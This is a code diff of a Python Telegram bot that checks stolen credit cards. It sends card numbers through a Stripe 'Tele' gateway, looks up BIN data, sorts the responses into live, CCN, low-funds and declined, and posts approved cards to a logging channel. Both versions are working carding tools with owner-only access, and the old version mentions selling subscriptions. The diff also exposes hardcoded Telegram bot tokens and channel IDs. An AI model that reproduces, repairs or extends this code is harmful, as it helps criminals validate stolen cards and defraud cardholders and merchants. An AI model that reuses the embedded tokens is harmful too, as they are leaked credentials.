@@ -1,184 +1,186 @@
 import requests
-import telebot
-import time
+import telebot, time, re, json, os
 from telebot import types
 from gatet import Tele
-import os
 
-CHANNEL_ID = -1003645329000
-TOKEN = '8535661885:AAG5PcG6TiMJWeLZptN3dTN-bUaWScE9D1A'
-bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
+# ================= BOT TOKEN =================
+token = '7767698545:AAGElWiWhfPEuuvRryKLyavgAQIs_6PNwRo'
+bot = telebot.TeleBot(token, parse_mode="HTML")
 
+# ================= LOG CHANNEL =================
+LOG_CHANNEL = -1003871702658  # သင့် Telegram channel ID ထည့်ပါ
 
-# ✅ Function to split long messages for Telegram
-def send_long_message(bot, chat_id, text, message_id=None, reply_markup=None):
-    max_length = 4096
-    for i in range(0, len(text), max_length):
-        if message_id:
-            bot.edit_message_text(
-                chat_id=chat_id,
-                message_id=message_id,
-                text=text[i:i+max_length],
-                reply_markup=reply_markup
-            )
-        else:
-            bot.send_message(chat_id, text[i:i+max_length])
+# ================= OWNER =================
+OWNER_ID = 7415233736  # ကိုယ့် Telegram ID ထည့်ပါ
 
+def guard_owner(message):
+    if message.from_user.id != OWNER_ID:
+        bot.reply_to(message, "❌ You are not authorized to use this bot.")
+        return False
+    return True
 
-@bot.message_handler(commands=["start"])
-def start(message):
-    if str(message.chat.id) != '7078867529':
-        bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription @Mydev1")
-        return
-    bot.reply_to(message, "Send the file now")
-
-
-@bot.message_handler(content_types=["document"])
-def main(message):
-    if str(message.chat.id) != '7078867529':
-        bot.reply_to(message, "You cannot use the bot to contact developers to purchase a bot subscription @Mydev1")
-        return
-
-    dd = 0
-    ch = 0
-    ccn = 0
-    cvv = 0
-    lowfund = 0
-
-    ko = bot.reply_to(message, "⌛ <b>🔍 CARD CHECKER INITIALIZING...</b>").message_id
-
-    file_info = bot.get_file(message.document.file_id)
-    downloaded_file = bot.download_file(file_info.file_path)
-
-    with open("combo.txt", "wb") as w:
-        w.write(downloaded_file)
-
+# ================= BIN INFO =================
+def get_bin_info(cc):
     try:
-        with open("combo.txt", 'r') as file:
-            lino = file.readlines()
+        bin_num = cc[:6]
+        res = requests.get(f'https://bins.antipublic.cc/bins/{bin_num}', timeout=5)
+        if res.status_code == 200:
+            data = res.json()
+            return {
+                'brand': data.get('brand', 'Unknown'),
+                'type': data.get('type', 'Unknown'),
+                'country': data.get('country_name', 'Unknown'),
+                'flag': data.get('country_flag', '🏁'),
+                'bank': data.get('bank', 'Unknown')
+            }
+    except:
+        pass
+    return {'brand': 'Unknown', 'type': 'Unknown', 'country': 'Unknown', 'flag': '🏁', 'bank': 'Unknown'}
 
-        for cc in lino:
+# ================= LOG AUTH ONLY =================
+def log_Auth_only(message, result_text, full_message):
+    try:
+        if not result_text:
+            return
 
-            if os.path.exists("stop.stop"):
-                send_long_message(
-                    bot, message.chat.id,
-                    '🛑 STOP ✅\nBOT BY ➜ @buik100',
-                    message_id=ko
-                )
-                os.remove("stop.stop")
-                return
+        t = result_text.lower()
 
-            cc = cc.strip()
-
-            try:
-                data = requests.get(
-                    'https://bins.antipublic.cc/bins/' + cc[:6],
-                    timeout=10
-                ).json()
-            except:
-                data = {}
-
-            brand = data.get('brand', 'Unknown')
-            card_type = data.get('type', 'Unknown')
-            country = data.get('country_name', 'Unknown')
-            country_flag = data.get('country_flag', '')
-            bank = data.get('bank', 'Unknown')
-
-            start_time = time.time()
-
-            try:
-                last = str(Tele(cc))
-            except Exception as e:
-                print(e)
-                last = "error"
-
-            execution_time = time.time() - start_time
-            last_lower = last.lower()
-
-            UI_PROCESSING = f"""
-<b>🔍 CARD CHECKER</b>
-━━━━━━━━━━━━━━
-💳 <code>{cc}</code>
-
-📌 <b>Status</b> ➜ {last}
-
-📊 <b>LIVE STATS</b>
-━━━━━━━━━━━━━━
-✅ Approved      : <b>{ch}</b>
-❌ Declined     : <b>{dd}</b>
-⚠️ CVV         : <b>{cvv}</b>
-🧾 CCN         : <b>{ccn}</b>
-💰 Low Funds    : <b>{lowfund}</b>
-━━━━━━━━━━━━━━
-⏱ Time         : {execution_time:.1f}s
-👑 BOT BY      ➜ @buik100
-"""
-
-            mes = types.InlineKeyboardMarkup()
-            stop_btn = types.InlineKeyboardButton("🛑 STOP", callback_data="stop")
-            mes.add(stop_btn)
-
-            # ✅ Use function to auto split and send
-            send_long_message(bot, message.chat.id, UI_PROCESSING, message_id=ko, reply_markup=mes)
-
-            msg = f"""
-<b>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱</b> — <b>Stripe Auth</b> ✅
-━━━━━━━━━━━━━━
-💳 <code>{cc}</code>
-━━━━━━━━━━━━━━
-🏷 <b>{brand}</b> · {cc[:6]}
-🏦 {bank}
-🌍 {country} {country_flag}
-
-⏱ <i>Time:</i> {execution_time:.1f}s
-━━━━━━━━━━━━━━
-by @Mydev1
-"""
-
-            print(last)
-
-            if 'succeeded' in last_lower or 'payment successful' in last_lower:
-                ch += 1
-                bot.send_message(CHANNEL_ID, msg)
-
-            elif 'your card was declined' in last_lower:
-                dd += 1
-
-            elif 'you cannot add a new payment method so soon after the previous one' in last_lower:
-                dd += 1
-                time.sleep(15)
-
-            elif 'does not support this type of purchase' in last_lower:
-                cvv += 1
-
-            elif 'security code is incorrect' in last_lower or 'security code is invalid' in last_lower:
-                ccn += 1
-
-            elif 'insufficient funds' in last_lower:
-                lowfund += 1
-
-            elif 'additional action before completion' in last_lower:
-                cvv += 1
-
-            else:
-                dd += 1
-                time.sleep(3)
+        # Auth ပါရင်ပဲ log ပို့မယ်
+        if "auth" in t:
+            bot.send_message(
+                LOG_CHANNEL,
+                full_message,
+                parse_mode="HTML",
+                disable_web_page_preview=True
+            )
 
     except Exception as e:
-        print(e)
-
-    send_long_message(
-        bot, message.chat.id,
-        '✅ CHECKED\nBOT BY ➜ @buik100',
-        message_id=ko
+        print("AUTH LOG ERROR:", e)
+# ================= START COMMAND =================
+@bot.message_handler(commands=["start"])
+def start(message):
+    if not guard_owner(message):
+        return
+    welcome_msg = (
+        f"👋 <b>Welcome!</b>\n\n"
+        f"👤 <b>User ID:</b> <code>{message.from_user.id}</code>\n"
+        f"━━━━━━━━━━━━━━\n"
+        f"Use <code>/chk card</code> to check cards."
     )
+    bot.reply_to(message, welcome_msg)
 
+# ================= CHECK COMMAND =================
+@bot.message_handler(commands=["chk"])
+def chk_handler(message):
+    if not guard_owner(message):
+        return
 
-@bot.callback_query_handler(func=lambda call: call.data == "stop")
-def stop_callback(call):
-    with open("stop.stop", "w") as f:
-        f.write("stop")
+    username = message.from_user.username
+    checker_name = f"@{username}" if username else message.from_user.first_name
 
+    input_text = message.text
+    cards = re.findall(r'\d{15,16}[\s|:/]\d{1,2}[\s|:/]\d{2,4}[\s|:/]\d{3,4}', input_text)
 
+    if not cards:
+        bot.reply_to(message, "❌ <b>No valid cards found!</b>")
+        return
+
+    cc_to_check = [re.sub(r'[\s:/]+', '|', c) for c in cards[:1]]
+
+    header = "⚡ GATEWAY ➼ STRIPE $1\n\n"
+    msg = bot.reply_to(message, "⏳ <b>Processing Request...</b>")
+
+    results_list = [None] * len(cc_to_check)
+
+    for i in range(len(cc_to_check)):
+        current_cc = cc_to_check[i]
+        bin_data = get_bin_info(current_cc)
+        start_time = time.time()
+
+        try:
+            res_raw = str(Tele(current_cc))
+            if "succeeded" in res_raw:
+                result = "Auth ✅"
+            elif "insufficient funds" in res_raw:
+                result = "Insufficient Funds 🔥"
+            elif "incorrect_cvc" in res_raw:
+                result = "CCN LIVE ✅"
+            elif "requires_action" in res_raw:
+                result = "3Ds (Requires Action) 🛡️"
+            elif "you cannot add a new payment method so soon after the previous one" in res_raw:
+                result = "Rate Limited ⏳"
+                time.sleep(10)   # 10 sec စော
+            else:
+                result = res_raw if res_raw else "DECLINED ❌"
+                time.sleep(10)
+        except Exception as e:
+            result = "Error ⚠️"
+
+        # Log charged only
+        log_Auth_only(
+            message,
+            result,
+            f"<b>Card:</b> <code>{current_cc}</code>\n<b>Status:</b> {result}"
+        )
+
+        # Execution time
+        exec_time = round(time.time() - start_time, 2)
+
+        # Save result
+        results_list[i] = (
+            f"💳 <b>Card:</b> <code>{current_cc}</code>\n"
+            f"💬 <b>Response:</b> <b>{result}</b>\n"
+            f"ℹ️ <b>Info:</b> {bin_data['brand'].upper()} - {bin_data['type'].upper()}\n"
+            f"🏦 <b>Bank:</b> {bin_data['bank'].upper()}\n"
+            f"🌍 <b>Country:</b> {bin_data['country'].upper()} {bin_data['flag']}\n"
+            f"⏱️ <b>Time:</b> {exec_time}s\n"
+            f"━━━━━━━━━━━━━━"
+        )
+
+        # Update progress display
+        display_text = header
+        for j in range(len(cc_to_check)):
+            if results_list[j]:
+                display_text += results_list[j] + "\n"
+            elif i == j:
+                display_text += f"<code>{cc_to_check[j]}</code>\nChecking...\n\n"
+            else:
+                display_text += f"<code>{cc_to_check[j]}</code>\nWaiting...\n\n"
+        display_text += f"👤 <b>Checker:</b> {checker_name}"
+
+        try:
+            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=display_text)
+        except:
+            pass
+
+        time.sleep(30)
+
+    # Final display
+    final_display = header
+    for res in results_list:
+        final_display += res + "\n"
+    final_display += f"\n👤 <b>Checker:</b> {checker_name}"
+
+    try:
+        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=final_display)
+    except:
+        pass
+
+# ================= MAIN LOOP =================
 if __name__ == "__main__":
-    bot.infinity_polling(timeout=10, long_polling_timeout=5)
+    print("Bot is running...")
+
+    # ✅ Bot start ဖြစ်ချိန် channel ကို test message ပို့မယ်
+    try:
+        bot.send_message(
+            LOG_CHANNEL,
+            "✅ Bot Started Successfully!"
+        )
+    except Exception as e:
+        print("Channel send error:", e)
+
+    while True:
+        try:
+            bot.polling(non_stop=True)
+        except Exception as e:
+            time.sleep(10)
